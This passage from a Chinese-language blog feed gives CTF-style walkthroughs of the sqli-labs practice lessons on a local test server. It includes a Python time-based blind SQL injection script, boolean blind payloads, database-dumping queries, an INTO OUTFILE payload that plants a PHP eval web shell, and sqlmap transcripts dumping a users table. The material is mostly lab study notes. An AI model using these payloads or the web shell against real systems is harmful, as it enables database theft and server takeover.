time.time()</span><br><span class="line">            response = requests.get(url= url+payload_str.format(n= l, r= n))</span><br><span class="line">            # 页面响应时间 = 结束执行的时间 - 开始执行的时间</span><br><span class="line">            use_time = time.time() - start_time</span><br><span class="line">            # 页面中出现此内容则表示成功</span><br><span class="line">            if use_time &gt; 5:</span><br><span class="line">                str+= chr(n)</span><br><span class="line">                print(&#x27;第&#x27;, l, &#x27;个字符猜解成功：&#x27;, str)</span><br><span class="line">                break;</span><br><span class="line">    return str;</span><br><span class="line"> </span><br><span class="line"># 开始猜解</span><br><span class="line">length = getLength(url, payload_len)</span><br><span class="line">getStr(url, payload_str, length)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">正在测试长度： 1</span><br><span class="line">正在测试长度： 2</span><br><span class="line">正在测试长度： 3</span><br><span class="line">正在测试长度： 4</span><br><span class="line">正在测试长度： 5</span><br><span class="line">正在测试长度： 6</span><br><span class="line">正在测试长度： 7</span><br><span class="line">测试长度完成，长度为： 8</span><br><span class="line">第 1 个字符猜解成功： s</span><br><span class="line">第 2 个字符猜解成功： se</span><br><span class="line">第 3 个字符猜解成功： sec</span><br><span class="line">第 4 个字符猜解成功： secu</span><br><span class="line">第 5 个字符猜解成功： secur</span><br><span class="line">第 6 个字符猜解成功： securi</span><br><span class="line">第 7 个字符猜解成功： securit</span><br><span class="line">第 8 个字符猜解成功： security</span><br></pre></td></tr></table></figure><p>然后就知道在security库里面</p><p>P.S.</p><p>脱库常用SQL指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 获取所有数据库</span><br><span class="line">(select group_concat(schema_name)</span><br><span class="line">from information_schema.schemata)</span><br><span class="line"> </span><br><span class="line"># 获取 security 库的所有表</span><br><span class="line">(select group_concat(table_name)</span><br><span class="line">from information_schema.tables</span><br><span class="line">where table_schema=&quot;security&quot;)</span><br><span class="line"> </span><br><span class="line"># 获取 users 表的所有字段</span><br><span class="line">(select group_concat(table_name)</span><br><span class="line">from information_schema.tables</span><br><span class="line">where table_schema=&quot;security&quot;)</span><br><span class="line"> </span><br><span class="line"># 获取数据库管理员的密码</span><br><span class="line">(select password</span><br><span class="line">from mysql.user</span><br><span class="line">where user=&quot;mituan&quot;)</span><br></pre></td></tr></table></figure><p>需要的时候直接将Python脚本中的payload改了就行</p><h3 id="用sqlmap"><a href="#用sqlmap" class="headerlink" title="用sqlmap"></a>用sqlmap</h3><p>上来直接指定level2</p><p>其余的跟之前的一样，这里就不过多重复了</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqllibs7</title>
      <link href="/2023/04/23/sqllibs7/"/>
      <url>/2023/04/23/sqllibs7/</url>
      
        <content type="html"><![CDATA[<p>上来输入?id=1“正常回显</p><p>看源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// connectivity </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=((&#x27;$id&#x27;)) LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line">if($row)</span><br><span class="line">&#123;</span><br><span class="line">  echo &#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;;</span><br><span class="line">  echo &#x27;You are in.... Use outfile......&#x27;;</span><br><span class="line">  echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">  echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">else </span><br><span class="line">&#123;</span><br><span class="line">echo &#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;;</span><br><span class="line">echo &#x27;You have an error in your SQL syntax&#x27;;</span><br><span class="line">//print_r(mysql_error());</span><br><span class="line">echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</span><br><span class="line">&lt;img src=&quot;../images/Less-7.jpg&quot; /&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>（只截取了后半部分）</p><p>这里与之前不同的是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;You have an error in your SQL syntax&#x27;;</span><br><span class="line">//print_r(mysql_error());</span><br></pre></td></tr></table></figure><p>注释掉了mysql_error，所以mysql语法错误不会被显示，所以就不能使用报错注入。</p><p>（wp说使用布尔盲注）</p><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>使用条件：只有登陆成功和登录失败两种情况</p><p>盲注步骤：</p><ol><li>使用 length()函数 判断查询结果的长度</li><li>使用 substr()函数 截取每一个字符，并穷举出字符内容</li></ol><p><a href="https://blog.csdn.net/wangyuxiang946/article/details/123486880">https://blog.csdn.net/wangyuxiang946/article/details/123486880</a></p><p>回到原题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)) and 1=2 --+</span><br></pre></td></tr></table></figure><p>回显错误，所以判断是布尔型注入，格式是?id=1’))语句–+</p><p>猜测数据库长度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">....</span><br><span class="line">?id=1&#x27;) ) and (length(database())&gt;7) --+</span><br><span class="line">?id=1&#x27;) ) and (length(database())&gt;8) --+</span><br></pre></td></tr></table></figure><p>这里&gt;7的时候正常回显，&gt;8则报错，所以判断数据库的长度是8位</p><p>后面是猜数据库名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.2:777/Less-7/</span><br><span class="line">?id=1&#x27;)) and (substr(database(),1,1) = &#x27;s&#x27;)--+</span><br></pre></td></tr></table></figure><p>显示是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You are in.... Use outfile......</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.2:777/Less-7/</span><br><span class="line">?id=1&#x27;)) and (substr(database(),2,1) = &#x27;e&#x27;)--+</span><br><span class="line">.......</span><br></pre></td></tr></table></figure><p>就这样一直猜，最后猜出来是”security”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1、查询表名字段数</span><br><span class="line">?id=1&#x27;) ) and (length(substr(select table_name from information_schema.tables where table_schema= &#x27;security&#x27; limit 0,1))&gt;1) --+</span><br><span class="line">......</span><br><span class="line">2、查询表名</span><br><span class="line">?id=1&#x27;) ) and  (ascii(substr((select table_name from information_schema.tables where table_schema = &#x27;security&#x27; limit 0,1),1,1))&gt;1) --+</span><br><span class="line">&gt;&gt;省略n步</span><br><span class="line">?id=1&#x27;) ) and  (ascii(substr((select table_name from information_schema.tables where table_schema = &#x27;security&#x27; limit 0,1),1,1))&gt;100) --+</span><br><span class="line">?id=1&#x27;) ) and  (ascii(substr((select table_name from information_schema.tables where table_schema = &#x27;security&#x27; limit 0,1),1,1))&gt;101) --+</span><br><span class="line">&gt;&gt;省略n步 查出所有的表</span><br></pre></td></tr></table></figure><p>这里没弄出来</p><p>换了一个wp，这个说要在服务器上写入文件</p><p><a href="http://127.0.0.2:777/Less-7/">http://127.0.0.2:777/Less-7/</a><br>?id=1”))union select 1,”<?php eval($_REQUEST[1])?>“,3 into outfile”D://Ctf//phpStudy_64//phpstudy_pro//WWW//sqli-labs-master//Less-7shell.php” –qwe</p><p>输入没问题，但就是不出现shell.php</p><p>据说是路径有问题，但我反复尝试了将\改成/，/变成//都不可，就很奇怪</p><p>但总的来说就是用一句话木马注入，方法应该没问题</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqllibs6</title>
      <link href="/2023/04/23/sqllibs6/"/>
      <url>/2023/04/23/sqllibs6/</url>
      
        <content type="html"><![CDATA[<p>第六题和第五题相差不大</p><p>只是第六题比第五题多了一个“</p><p>可以类比sqllibs1-4来进行尝试</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqllibs 1-9 用sqlmap自动注入</title>
      <link href="/2023/04/23/sqllibs1-9/"/>
      <url>/2023/04/23/sqllibs1-9/</url>
      
        <content type="html"><![CDATA[<p>Sqlmap是一个py文件</p><p>所以要在cmd中使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">D:\Ctf\sqlmap\sqlmap&gt;python sqlmap.py -u  http://127.0.0.2:777/Less-6/?id=1</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[)]_____ ___ ___  &#123;1.7.3.4#dev&#125;</span><br><span class="line">|_ -| . [)]     | .&#x27;| . |</span><br><span class="line">|___|_  [&#x27;]_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   https://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 19:30:02 /2023-04-23/</span><br><span class="line"></span><br><span class="line">[19:30:03] [INFO] resuming back-end DBMS &#x27;mysql&#x27;</span><br><span class="line">[19:30:03] [INFO] testing connection to the target URL</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment)</span><br><span class="line">    Payload: id=1&quot; AND 3744=3744#</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</span><br><span class="line">    Payload: id=1&quot; AND GTID_SUBSET(CONCAT(0x7176626a71,(SELECT (ELT(7253=7253,1))),0x716a717171),7253)-- vAnE</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: id=1&quot; AND (SELECT 4714 FROM (SELECT(SLEEP(5)))bfJG)-- Mruu</span><br><span class="line">---</span><br><span class="line">[19:30:03] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web application technology: Apache 2.4.39, PHP 5.5.9</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.6</span><br><span class="line">[19:30:03] [INFO] fetched data logged to text files under &#x27;C:\Users\86138\AppData\Local\sqlmap\output\127.0.0.2&#x27;</span><br><span class="line"></span><br><span class="line">[*] ending @ 19:30:03 /2023-04-23/</span><br></pre></td></tr></table></figure><p>判断是否有注入点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">D:\Ctf\sqlmap\sqlmap&gt;python sqlmap.py -u  http://127.0.0.2:777/Less-6/?id=1  --current-db</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[&quot;]_____ ___ ___  &#123;1.7.3.4#dev&#125;</span><br><span class="line">|_ -| . [&#x27;]     | .&#x27;| . |</span><br><span class="line">|___|_  [)]_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   https://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 19:30:55 /2023-04-23/</span><br><span class="line"></span><br><span class="line">[19:30:55] [INFO] resuming back-end DBMS &#x27;mysql&#x27;</span><br><span class="line">[19:30:55] [INFO] testing connection to the target URL</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment)</span><br><span class="line">    Payload: id=1&quot; AND 3744=3744#</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</span><br><span class="line">    Payload: id=1&quot; AND GTID_SUBSET(CONCAT(0x7176626a71,(SELECT (ELT(7253=7253,1))),0x716a717171),7253)-- vAnE</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: id=1&quot; AND (SELECT 4714 FROM (SELECT(SLEEP(5)))bfJG)-- Mruu</span><br><span class="line">---</span><br><span class="line">[19:30:56] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web application technology: Apache 2.4.39, PHP 5.5.9</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.6</span><br><span class="line">[19:30:56] [INFO] fetching current database</span><br><span class="line">[19:30:56] [INFO] retrieved: &#x27;security&#x27;</span><br><span class="line">current database: &#x27;security&#x27;</span><br><span class="line">[19:30:56] [INFO] fetched data logged to text files under &#x27;C:\Users\86138\AppData\Local\sqlmap\output\127.0.0.2&#x27;</span><br><span class="line"></span><br><span class="line">[*] ending @ 19:30:56 /2023-04-23/</span><br></pre></td></tr></table></figure><p>找出当前数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">D:\Ctf\sqlmap\sqlmap&gt;python sqlmap.py -u  http://127.0.0.2:777/Less-6/?id=1  -tables -D &quot;security&quot;</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[)]_____ ___ ___  &#123;1.7.3.4#dev&#125;</span><br><span class="line">|_ -| . [.]     | .&#x27;| . |</span><br><span class="line">|___|_  [,]_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   https://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 19:31:15 /2023-04-23/</span><br><span class="line"></span><br><span class="line">[19:31:15] [INFO] resuming back-end DBMS &#x27;mysql&#x27;</span><br><span class="line">[19:31:15] [INFO] testing connection to the target URL</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment)</span><br><span class="line">    Payload: id=1&quot; AND 3744=3744#</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</span><br><span class="line">    Payload: id=1&quot; AND GTID_SUBSET(CONCAT(0x7176626a71,(SELECT (ELT(7253=7253,1))),0x716a717171),7253)-- vAnE</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: id=1&quot; AND (SELECT 4714 FROM (SELECT(SLEEP(5)))bfJG)-- Mruu</span><br><span class="line">---</span><br><span class="line">[19:31:16] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web application technology: Apache 2.4.39, PHP 5.5.9</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.6</span><br><span class="line">[19:31:16] [INFO] fetching tables for database: &#x27;security&#x27;</span><br><span class="line">[19:31:16] [INFO] retrieved: &#x27;emails&#x27;</span><br><span class="line">[19:31:16] [INFO] retrieved: &#x27;referers&#x27;</span><br><span class="line">[19:31:16] [INFO] retrieved: &#x27;uagents&#x27;</span><br><span class="line">[19:31:16] [INFO] retrieved: &#x27;users&#x27;</span><br><span class="line">Database: security</span><br><span class="line">[4 tables]</span><br><span class="line">+----------+</span><br><span class="line">| emails   |</span><br><span class="line">| referers |</span><br><span class="line">| uagents  |</span><br><span class="line">| users    |</span><br><span class="line">+----------+</span><br><span class="line"></span><br><span class="line">[19:31:16] [INFO] fetched data logged to text files under &#x27;C:\Users\86138\AppData\Local\sqlmap\output\127.0.0.2&#x27;</span><br><span class="line"></span><br><span class="line">[*] ending @ 19:31:16 /2023-04-23/</span><br></pre></td></tr></table></figure><p>找出当前数据库下的所有的表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">D:\Ctf\sqlmap\sqlmap&gt;python sqlmap.py -u  http://127.0.0.2:777/Less-6/?id=1  -columns -D &quot;security&quot; -T &quot;users&quot;</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[&quot;]_____ ___ ___  &#123;1.7.3.4#dev&#125;</span><br><span class="line">|_ -| . [,]     | .&#x27;| . |</span><br><span class="line">|___|_  [.]_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   https://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 19:31:43 /2023-04-23/</span><br><span class="line"></span><br><span class="line">[19:31:43] [INFO] resuming back-end DBMS &#x27;mysql&#x27;</span><br><span class="line">[19:31:43] [INFO] testing connection to the target URL</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment)</span><br><span class="line">    Payload: id=1&quot; AND 3744=3744#</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</span><br><span class="line">    Payload: id=1&quot; AND GTID_SUBSET(CONCAT(0x7176626a71,(SELECT (ELT(7253=7253,1))),0x716a717171),7253)-- vAnE</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: id=1&quot; AND (SELECT 4714 FROM (SELECT(SLEEP(5)))bfJG)-- Mruu</span><br><span class="line">---</span><br><span class="line">[19:31:43] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web application technology: PHP 5.5.9, Apache 2.4.39</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.6</span><br><span class="line">[19:31:43] [INFO] fetching columns for table &#x27;users&#x27; in database &#x27;security&#x27;</span><br><span class="line">[19:31:43] [INFO] resumed: &#x27;id&#x27;</span><br><span class="line">[19:31:43] [INFO] resumed: &#x27;int(3)&#x27;</span><br><span class="line">[19:31:43] [INFO] resumed: &#x27;username&#x27;</span><br><span class="line">[19:31:43] [INFO] resumed: &#x27;varchar(20)&#x27;</span><br><span class="line">[19:31:43] [INFO] resumed: &#x27;password&#x27;</span><br><span class="line">[19:31:43] [INFO] resumed: &#x27;varchar(20)&#x27;</span><br><span class="line">Database: security</span><br><span class="line">Table: users</span><br><span class="line">[3 columns]</span><br><span class="line">+----------+-------------+</span><br><span class="line">| Column   | Type        |</span><br><span class="line">+----------+-------------+</span><br><span class="line">| id       | int(3)      |</span><br><span class="line">| password | varchar(20) |</span><br><span class="line">| username | varchar(20) |</span><br><span class="line">+----------+-------------+</span><br><span class="line"></span><br><span class="line">[19:31:43] [INFO] fetched data logged to text files under &#x27;C:\Users\86138\AppData\Local\sqlmap\output\127.0.0.2&#x27;</span><br><span class="line"></span><br><span class="line">[*] ending @ 19:31:43 /2023-04-23/</span><br></pre></td></tr></table></figure><p>找出users中的字段，发现username和password</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line">D:\Ctf\sqlmap\sqlmap&gt;python sqlmap.py -u  http://127.0.0.2:777/Less-6/?id=1  -columns -D &quot;security&quot; -T &quot;users&quot; -dump</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[&#x27;]_____ ___ ___  &#123;1.7.3.4#dev&#125;</span><br><span class="line">|_ -| . [&#x27;]     | .&#x27;| . |</span><br><span class="line">|___|_  [,]_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   https://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal 